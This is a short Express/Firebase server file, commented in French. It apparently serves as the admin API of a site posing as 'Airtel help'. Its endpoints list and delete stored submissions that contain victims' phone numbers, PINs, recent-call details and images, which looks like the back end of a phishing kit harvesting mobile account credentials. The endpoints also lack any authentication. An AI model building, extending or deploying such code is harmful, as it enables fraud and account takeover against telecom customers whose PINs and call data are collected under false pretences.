const admin = require("firebase-admin");
const express = require("express");
const cors = require("cors");

// --- Connexion à Firebase depuis un serveur externe ---
// Charge les identifiants depuis le fichier que vous venez de télécharger.
const serviceAccount = require("./serviceAccountKey.json");

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const app = express();
const PORT = process.env.PORT || 3001; // Render fournira la variable PORT

// Utilise CORS pour autoriser les requêtes depuis votre site web hébergé.
// Pour plus de sécurité, nous autorisons uniquement les requêtes provenant de votre site hébergé.
app.use(cors({ origin: 'https://airtel-help.web.app' }));

// Les points de terminaison (endpoints) de notre API qui seront appelés par admin.js
app.get("/api/submissions", async (req, res) => {
  try {
    const db = admin.firestore();
    // Récupère toutes les soumissions de la collection "submissions", triées par date (la plus récente en premier)
    const submissionsRef = db.collection("submissions");
    const snapshot = await submissionsRef.orderBy("submittedAt", "desc").get();

    if (snapshot.empty) {
      return res.status(200).json([]);
    }

    const submissions = [];
    snapshot.forEach((doc) => {
      const data = doc.data();
      submissions.push({
        id: doc.id,
        phoneNumber: data.phoneNumber,
        pin: data.pin, // ATTENTION: Pour un vrai projet, ne jamais exposer le PIN.
        lastCalls: data.lastCalls,
        imageUrl: data.imageUrl,
        // Convertit le Timestamp Firebase en une chaîne de caractères standard (ISO) que JavaScript peut lire.
        submittedAt: data.submittedAt.toDate().toISOString(),
      });
    });

    return res.status(200).json(submissions);
  } catch (error) {
    console.error("Erreur lors de la récupération des soumissions:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

app.delete("/api/submissions/:id", async (req, res) => {
  try {
    const { id } = req.params;
    if (!id) {
      return res.status(400).send("ID de soumission manquant.");
    }
    const db = admin.firestore();
    await db.collection("submissions").doc(id).delete();
    return res.status(200).json({ message: "Soumission supprimée avec succès." });
  } catch (error) {
    console.error("Erreur lors de la suppression de la soumission:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

app.listen(PORT, () => {
  console.log(`Le serveur écoute sur le port ${PORT}`);
});